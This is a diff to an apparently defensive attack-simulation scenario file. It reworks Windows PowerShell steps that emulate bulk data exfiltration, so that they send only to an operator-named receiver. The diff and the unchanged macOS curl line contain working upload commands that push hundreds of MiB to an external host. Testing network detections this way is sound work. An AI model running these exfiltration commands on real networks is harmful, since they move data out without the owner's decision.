@@ -87,7 +87,31 @@ steps:
     # Root of the causality spine — links from the CGO (containerd-shim).
     platforms: ["linux", "container", "windows"]
     platform_variants:
-      windows: "Invoke-WebRequest -Uri https://exfil-receiver.testmynids.org/upload -Method Head -UseBasicParsing"
+      # CONT-16: the Windows leg sends only where the operator says. It reads
+      # the receiver from CORTEXSIM_EXFIL_URL and refuses without one: the push
+      # bundle's preflight reports the step not-executed
+      # (OPERATOR_INPUT_MISSING), and on the pull path, which has no preflight,
+      # the text itself fails by name before any request is made. For a beacon
+      # installed as a service, set it as a machine environment variable and
+      # restart the service.
+      # What follows from an operator-named receiver: the pre-flight XQL on
+      # TTP-2026-0068 filters dst_host = "exfil-receiver.testmynids.org", so
+      # substitute your receiver's host when you run it; and the volume BIOC
+      # excludes RFC1918 destinations, so the receiver must be one the NGFW
+      # sees as external. The probe itself stays non-fatal, like the curl.
+      windows: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072
+        $u = $env:CORTEXSIM_EXFIL_URL
+        if ($u -notmatch '^https?://') {
+          Write-Error 'cortexsim-ndr-005: CORTEXSIM_EXFIL_URL must name an http(s) upload receiver you control. Nothing was sent.'
+          exit 1
+        }
+        try {
+          $r = Invoke-WebRequest -Uri $u -Method Head -UseBasicParsing -TimeoutSec 15
+          Write-Host ('cortexsim-ndr-005-receiver-probe status=' + [int]$r.StatusCode)
+        } catch {
+          Write-Host ('cortexsim-ndr-005-receiver-probe answered: ' + $_.Exception.Message)
+        }
     expected_detections:
       - plane: NDR
         type: XQL
@@ -128,9 +152,47 @@ steps:
       pivot: shared_entity
     platforms: ["linux", "container", "windows", "macos"]
     platform_variants:
-      # Windows chunked HTTPS upload — same volumetric, upload-skewed, long-lived
-      # egress shape to the authorised receiver.
-      windows: '1..4 | ForEach-Object { Invoke-WebRequest -Uri https://exfil-receiver.testmynids.org/upload -Method POST -Body ([byte[]]::new(268435456)) -UseBasicParsing }'
+      # Windows chunked upload: the same volumetric, upload-skewed shape, to the
+      # receiver the operator names in CORTEXSIM_EXFIL_URL (CONT-16, see
+      # step-01). It used to POST four [byte[]]::new(268435456) arrays of zeros
+      # to a hard-coded third-party host: 1 GiB out of a customer network with
+      # no operator decision, four 256 MiB allocations in one PowerShell
+      # process, and not the random payload the step is named for. It now
+      # writes one random 4 MiB buffer 64 times per request, so 4 x 256 MiB
+      # reach the wire with 4 MiB held. A request that cannot be sent fails the
+      # step. Streaming without buffering is a .NET Framework behaviour
+      # (AllowWriteStreamBuffering); it has not been observed on Windows.
+      windows: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072
+        $u = $env:CORTEXSIM_EXFIL_URL
+        if ($u -notmatch '^https?://') {
+          Write-Error 'cortexsim-ndr-005: CORTEXSIM_EXFIL_URL must name an http(s) upload receiver you control. Nothing was sent.'
+          exit 1
+        }
+        $buf = New-Object byte[] 4194304
+        (New-Object System.Random).NextBytes($buf)
+        $sent = 0
+        foreach ($n in 1..4) {
+          try {
+            $req = [System.Net.WebRequest]::Create($u)
+            $req.Method = 'POST'
+            $req.ContentType = 'application/octet-stream'
+            $req.ContentLength = 268435456
+            $req.AllowWriteStreamBuffering = $false
+            $req.Timeout = 600000
+            $req.ReadWriteTimeout = 600000
+            $s = $req.GetRequestStream()
+            foreach ($i in 1..64) { $s.Write($buf, 0, $buf.Length) }
+            $s.Close()
+            $sent++
+            try { $req.GetResponse().Close() }
+            catch { Write-Host ('cortexsim-ndr-005 request ' + $n + ' sent; receiver answered: ' + $_.Exception.Message) }
+          } catch {
+            Write-Error ('cortexsim-ndr-005 request ' + $n + ' failed: ' + $_.Exception.Message)
+          }
+        }
+        Write-Host ('cortexsim-ndr-005-bulk-upload requests_sent=' + $sent + ' of 4 bytes_each=268435456')
+        if ($sent -lt 4) { exit 1 }
       # macOS/zsh chunked upload with curl streaming 256 MiB random chunks x4.
       macos: 'for i in $(seq 1 4); do dd if=/dev/urandom bs=1m count=256 2>/dev/null | curl -s -X POST --data-binary @- https://exfil-receiver.testmynids.org/upload; done'
     expected_detections:
